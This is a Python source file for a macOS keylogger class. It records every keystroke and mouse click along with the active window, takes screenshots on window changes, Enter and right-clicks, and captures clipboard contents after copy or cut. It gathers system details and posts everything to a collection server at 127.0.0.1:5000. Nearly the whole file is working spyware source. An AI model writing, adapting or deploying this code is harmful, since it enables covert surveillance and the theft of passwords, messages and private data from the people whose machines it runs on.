import Quartz
import time, datetime
import platform
import requests, json
from Quartz import CGWindowListCopyWindowInfo, kCGNullWindowID, kCGWindowListOptionOnScreenOnly
from pynput.keyboard import Listener as KeyListener
from pynput.mouse import Listener as MouseListener
from PIL import ImageGrab
from pandas.io.clipboard import clipboard_get
from pynput import mouse

class Keylogger:
  log_dir = r"./data/"
  stringKey = ""
  lastKey = ""
  os_data = {}
  
  def __init__(self):
    self.os_data["osName"] = platform.uname().system
    self.os_data["osInfo"] = self.get_os_info()
    self.os_data["appName"] = self.get_app_name()
    self.appName = self.get_active_window()
    self.send_data('/init')

  def get_os_info(self):
      return platform.platform(), platform.uname(), platform.system(), platform.release(), platform.version(), platform.machine(), platform.processor(), platform.architecture(), platform.node(), platform.platform(), platform.python_build(), platform.python_compiler(), platform.python_branch(), platform.python_implementation(), platform.python_revision(), platform.python_version(), platform.python_version_tuple()

  def get_app_name(self):
      return self.get_active_window().split()[0]
  
  def get_active_window(self):
    windows = Quartz.CGWindowListCopyWindowInfo(Quartz.kCGWindowListExcludeDesktopElements | Quartz.kCGWindowListOptionOnScreenOnly, Quartz.kCGNullWindowID)
    for win in windows:
      if win['kCGWindowLayer'] == 0:
        return '%s %s' % (win[Quartz.kCGWindowOwnerName], win.get(Quartz.kCGWindowName, '')) 
    
  def get_date_time(self):
      now = datetime.datetime.now()
      return now.strftime("%Y-%m-%d %H:%M:%S:%f")
  
  def capture_screen(self):
      snapshot = ImageGrab.grab()
      snapshot = snapshot.convert("RGBA")
      file_name = self.log_dir + "Screenshot" + self.get_date_time() + self.get_app_name() + ".png"
      file_name = file_name.replace(":", "-")
      snapshot.save(file_name)

  def get_clipboard(self):
      data = clipboard_get()            
      return data
          
  def writeLog(self, dir, time, appName, key):
      with open(dir + "keyLog.txt", "a", encoding="utf-8") as f:
          f.write(time + ": " + appName + " - " + key + "\n")
          self.send_data('/send', {
            "time": time,
            "appName": appName,
            "key": key + "\n"
          })

          if(self.lastKey != "Key.cmd" and str(key) != "c"):
            self.stringKey += key

          if(key == "Key.enter"):
              self.stringKey = ' '.join(self.stringKey)
              f.write("==> " + time + ": " + appName + " - " + self.stringKey + "\n")

              self.send_data('/send', {
                "time": time,
                "appName": appName,
                "key": self.stringKey + "\n"
              })

              self.stringKey = ""

          f.close()
  
  def on_press(self, key):   
      print(key)  
      print(self.get_app_name() + " - " + str(key))
      if (self.get_active_window() != self.appName or str(key) == "Key.enter"): 
          self.capture_screen()
          self.appName = self.get_active_window()

      print(self.lastKey + " - " + str(key))
      #Check clipboard change
      if (self.lastKey == "Key.cmd" and (str(key) == "'c'" or str(key) == "'x'")):
          self.writeLog(self.log_dir, self.get_date_time(), self.get_active_window(), "Clipboard: " + self.get_clipboard())
      
      self.writeLog(self.log_dir, self.get_date_time(), self.get_active_window(), str(key))
      self.lastKey = str(key)

  def on_click(self, x, y, button, pressed):
      if pressed and button == mouse.Button.right:
          print("Right Click Detected (released)")
          self.capture_screen()

      print('{0} at {1} on app {2}'.format('Pressed' if pressed else 'Released', (x, y), self.get_active_window()))
      self.writeLog(self.log_dir, self.get_date_time(), self.get_active_window(), '{0} at {1}'.format('Pressed' if pressed else 'Released', (x, y)))
      self.send_data('/send', {
        "time": self.get_date_time(),
        "appName": self.get_active_window(),
        "key": '{0} at {1}'.format('Pressed' if pressed else 'Released', (x, y))
      })

  def send_data(self, url, data_value=None):
    url = 'http://127.0.0.1:5000' + url
    print(json.dumps(self.os_data))
    headers = {"os_data": json.dumps(self.os_data)}
    
    response = requests.post(url, json=data_value, headers=headers)
    print(response)
    return response

  def run(self):
    with MouseListener(on_click=self.on_click) as listener:
      with KeyListener(on_press=self.on_press) as listener:
        listener.join()